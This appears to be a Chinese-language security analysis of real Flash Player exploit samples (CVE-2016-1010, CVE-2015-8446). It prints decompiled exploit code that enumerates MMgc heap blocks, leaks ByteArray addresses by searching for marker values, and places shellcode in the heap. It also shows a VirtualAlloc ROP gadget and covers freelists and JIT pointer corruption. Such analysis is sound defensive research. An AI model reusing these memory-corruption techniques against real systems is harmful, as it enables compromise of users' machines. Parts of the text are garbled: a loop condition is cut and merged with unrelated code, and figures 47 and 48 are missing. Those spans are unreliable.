#### ParseFixedBlock
在EnumerateFixedBlocks(hhh222)函数中会调用ParseFixedBlock(vcb4)来遍历FixedBlock链表。
    public function EnumerateFixedBlocks (param1:int, param2:Boolean, param3:Boolean = true, param4:___Int64 = undefined) : Array
    {
      var fixedBlockAddr:* = null as ___Int64;
      var _loc8_:* = null as ___Int64;
      var _loc9_:* = 0;
      var _loc10_:* = null as ByteArray;
      var fixedBlockInfo:* = null;
      var _loc5_:Array = [];
      var _loc6_:* = ParseFixedAllocHeaderBySize(param1,param2);
      if(param3)
      {
        fixedBlockAddr = _loc6_.m_firstBlock;
      }
      else
      {
        fixedBlockAddr = _loc6_.m_lastBlock;
      }
      while(!(jjjj222222lpmc.IsZero(fixedBlockAddr)))
      {
        ...
        _loc10_ = gg2rw.readn(fixedBlockAddr,Jdfgdf435GwgVfg.Hfghgfh3); // read by chunk. _loc10_: ByteArray
        fixedBlockInfo = ParseFixedBlock(_loc10_, fixedBlockAddr); // fixedBlockAddr: size
        _loc5_.push(fixedBlockInfo);
        if(param3)
        {
          fixedBlockAddr = fixedBlockInfo.next;
        }
        else
        {
          fixedBlockAddr = fixedBlockInfo.prev;
        }
      }
      return _loc5_;
图41 借助ParseFixedBlock函数来遍历FixedBlock链表
其中，结构体FixedBlock的定义如下。
    struct FixedBlock
    {
      void* firstFree;      // First object on the block's free list
      void* nextItem;       // First object free at the end of the block
      FixedBlock* next;     // Next block on the list of blocks (m_firstBlock list in the allocator)
      FixedBlock* prev;     // Previous block on the list of blocks
      uint16_t numAlloc;    // Number of items allocated from the block
      uint16_t size;        // Size of objects in the block
      FixedBlock *nextFree; // Next block on the list of blocks with free items (m_firstFree list in the allocator)
      FixedBlock *prevFree; // Previous block on the list of blocks with free items
      FixedAlloc *alloc;    // The allocator that owns this block
      char items[1];        // Memory for objects starts here
    };
图42 FixedBlock结构的定义
ParseFixedBlock(vcb4)函数将基于上述定义对FixedBlock进行解析。
    public function ParseFixedBlock (param1:ByteArray, param2:___Int64) : Object
    {
      var _loc3_:* = {
        "firstFree":jjjj222222lpmc.ReadPointer(param1),
        "nextItem":jjjj222222lpmc.ReadPointer(param1),
        "next":jjjj222222lpmc.ReadPointer(param1),
        "prev":jjjj222222lpmc.ReadPointer(param1),
        "numAlloc":param1.readUnsignedShort(),
        "size":param1.readUnsignedShort(),
        "prevFree":jjjj222222lpmc.ReadPointer(param1),
        "nextFree":jjjj222222lpmc.ReadPointer(param1),
        "alloc":jjjj222222lpmc.ReadPointer(param1),
        "blockData":param1,
        "blockAddr":param2
      };
      return _loc3_;
    }
图43 ParseFixedBlock函数
#### 4.2 泄漏ByteArray对象的地址
在CVE-2016-1010的利用样本中还用到了ByteArray对象的地址泄露技术。
#### GetByteArrayAddress
GetByteArrayAddress(hgfh342)函数会将获取到的第一个参数作为期望对象的大小，并枚举MMgc内存空间中具有此大小的对象，最终会返回所有找到的内存块相应的解析结果。
这里GetByteArrayAddress(hgfh342)函数返回的是pairs类型（[ByteArray::Buffer,ByteArray::Buffer.array]）的数组，其中，exploit可以在ByteArray::Buffer.array地址上放置想要的数据。
此外，GetByteArrayAddress(hgfh342)函数需要调用EnumerateFixedBlocks(hhh222)来定位ByteArray对象的堆地址，所给的期望对象大小为40或24，这取决于具体运行的Flash版本。
    public function J34534534(_arg_1:*, _arg_2:Object, _arg_3:Jdfgdfgd34):void
    {
      ...
      hgfh4343 = 24;
      if ((((nnfgfg3.nfgh23[0] >= 20)) || ((((nnfgfg3.nfgh23[0] == 18)) && ((nnfgfg3.nfgh23[3] >= 324)))))) // Flash version check
      {
        ...
        hgfh4343 = 40;
      };
      ...
    }
    public function GetByteArrayAddress (param1:ByteArray, param2:Boolean = false, param3:int = 0) : Array
    {
      ...
      var _loc9_:Array = jhghjhj234544. EnumerateFixedBlocks (hgfh4343,true); // hgfh4343 is 40 or 24 depending on the Flash version – this is supposed to be the ByteArray object size
    }
图44 在GetByteArrayAddress函数中进行EnumerateFixedBlocks调用
正如上面所说，GetByteArrayAddress(hgfh342)函数通过EnumerateFixedBlocks(hhh222)调用来获取具有特定大小的堆块，即ByteArray对象，之后会在这些对象中查找特殊的标记值。
    public function GetByteArrayAddress(_arg_1:ByteArray, _arg_2:Boolean=false, marker:int=0):Array
    {
      ...
      var fixedBlockArr:Array = jhghjhj234544. EnumerateFixedBlocks(hgfh4343, true);
      var _local_10:int;
      var fixedBlockArrLength:int = fixedBlockArr.length;
      while (_local_10  0)
        {
          _local_15.position = _local_14;
          if (bgfh4)
          {
            _local_15.position = (_local_14 + bbfgh4);
            _local_16 = _local_15.readUnsignedInt();
            _local_15.position = (_local_14 + bgfhgfh34);
            _local_17 = _local_15.readUnsignedInt();
            if ((_local_16 == _local_5))
            {
              _local_15.position = (_local_14 + bbgfgfh4);
              _local_7 = gggexss.AddInt64(fixedBlockArr[i].blockAddr, _local_14);
              _local_6 = jhghjhj234544.jjjj222222lpmc.ReadPointerSizeData(_local_15, false);
              if (((marker!= (0)) && (((!((_local_6.high == _local_8.high))) || (!((_local_6.low == _local_8.low)))))))
              {
                if (hhiwr.read4(_local_6) == marker) // Compare marker
                {
                  return ([_local_7, _local_6]);
                };
              }
              else
              {
                _local_18 = new ___Int64(0, 0);
                _local_8 = _local_18;
                if (((!((_local_6.high == _local_8.high))) || (!((_local_6.low == _local_8.low)))))
                {
                  return ([_local_7, _local_6]);
                };
              };
            };
          }
          ...
          _local_14 = (_local_14 + hgfh4343);
          _local_13--;
        };
图45 在GetByteArrayAddress(hgfh342)函数中对标记值进行启发式搜索
    public function AllocateByteArrays():Boolean
    {
      ...
      var randomInt:int = Math.ceil(((Math.random() * 0xFFFFFF) + 1));
      ...
      g4 = GetByteArrayAddress(freelists_bytearray, false, randomInt)[1]; // MMgc structure address
      hg45 = GetByteArrayAddress(shellcode_bytearray, false, randomInt)[1]; // Shellcode BytreArray
      ...
    }
图46 randomInt是一个随机生成的标记值
#### 4.3 获取GCBlock的结构
此外，在发现的CVE-2015-8446利用样本中则借助内存的可预测性来访问Flash
Player的内部结构。此例中，在完成堆喷操作后，GCBlock对象会被分配到地址0x1a000000上，而地址0x1a000008中的内容正是exploit要寻找的GC对象基址。
    ReadInt 1a000004 000007b0  u 6e83940f
      6e83940f ff152874ca6e call dword ptr [Flash!_imp__VirtualAlloc (6eca7428)]
      6e839415 5d pop ebp
      6e839416 c3 ret
图49 exploit中用到的ROP Gadget
### 5 JIT运行时攻击
另一方面，由于CFG保护的存在，攻击者们也逐渐移步到Flash的JIT(just-in-time)运行时，相关[攻击理念](https://www.blackhat.com/docs/eu-15/materials/eu-15-Falcon-Exploiting-Adobe-Flash-Player-In-The-Era-Of-Control-Flow-Guard.pdf)早前已由Francisco
Falcon提出过了，而以JIT方式执行CFG代码则可缓解此类利用。在实际获取的CVE-2016-1010和[CVE-2015-8446](http://blogs.360.cn/360safe/2015/12/19/angler-ek%E6%9C%80%E6%96%B0cve-2015-8446-flash-exploit%E5%88%86%E6%9E%90/)利用样本中我们还观察到了更巧妙的攻击手法，其中一个方法通过已知的CFG保护缺陷来破坏栈上的返回地址，相关细节我们将在未来进行讨论。在这里，我们分享一些关于freelists结构滥用以及MethodInfo._implGPR函数指针corruption的具体细节。
#### 5.1 操控Freelists结构
在CVE-2016-1010的利用样本中，shellcode所保存的位置非常有意思，其中就涉及到了如何操控freelists结构。下面开始分析，可以看到，StartExploit(hgfghfgj2)函数首先调用了AllocateByteArrays(jhgjhj22222)方法，而后会通过名为shellcode_bytearray的ByteArray对象将shellcode写入堆空间。
    public function StartExploit(_arg_1:ByteArray, _arg_2:int):Boolean
    {
      var _local_4:int;
      var _local_11:int;
      if (!(AllocateByteArrays ()))
      {
        return (false);
      };
      ...
      _local_8 = _local_12;
      shellcode_bytearray.position = (_local_8.low + 0x1800); // a little bit inside the heap region, to be safe not to be cleared up
      shellcode_bytearray.writeBytes(_arg_1); // Writing shellcode to target ByteArray.
图50 分配ByteArray对象并写入shellcode
此exploit通过GetByteArrayAddress(hgfh342)方法获取用于存放freelists元素的内存地址，下述给出的结果中该地址为0x16893000。